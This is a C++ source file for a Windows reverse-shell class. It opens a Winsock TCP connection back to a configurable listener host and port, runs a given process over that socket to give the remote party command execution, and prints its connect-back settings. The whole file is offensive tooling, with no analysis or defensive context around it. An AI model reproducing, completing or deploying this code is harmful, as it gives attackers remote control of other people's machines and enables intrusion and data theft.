#include "reverse_shell.h"

ReverseShell::ReverseShell(std::string lhost, int lport, short family, char* process)
{
	this->ReverseShell::lhost = lhost;
	this->ReverseShell::lport = lport;
	this->ReverseShell::family = family;
	this->ReverseShell::process = process;
}

SOCKET ReverseShell::init_socket()
{
	SOCKET s;
	WSADATA wsa;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	return s;
}

sockaddr_in ReverseShell::s_setting()
{
	struct sockaddr_in s;
	s.sin_family = ReverseShell::family;
	s.sin_addr.s_addr = inet_addr(ReverseShell::lhost.c_str());
	s.sin_port = htons(ReverseShell::lport);
	return s;
}

void ReverseShell::reverse_s(SOCKET socks, struct sockaddr_in s)
{
	if (connect(socks, s) != -1)
	{
		execute_process(socks, ReverseShell::process);
	}
	return;
}

void ReverseShell::exec()
{
	SOCKET ss = ReverseShell::init_socket();
	sockaddr_in config = ReverseShell::s_setting();
	ReverseShell::reverse_s(ss, config);
	return;
}

void ReverseShell::get_config()
{
	std::cout << "[+] Connect Back Host : " << ReverseShell::lhost << std::endl;
	std::cout << "[+] Connect Back Port : " << ReverseShell::lport << std::endl;
	std::cout << "[+] Family Type : " << ReverseShell::family << std::endl;
	std::cout << "[+] Reverse Process : " << ReverseShell::process << std::endl;
	return;
}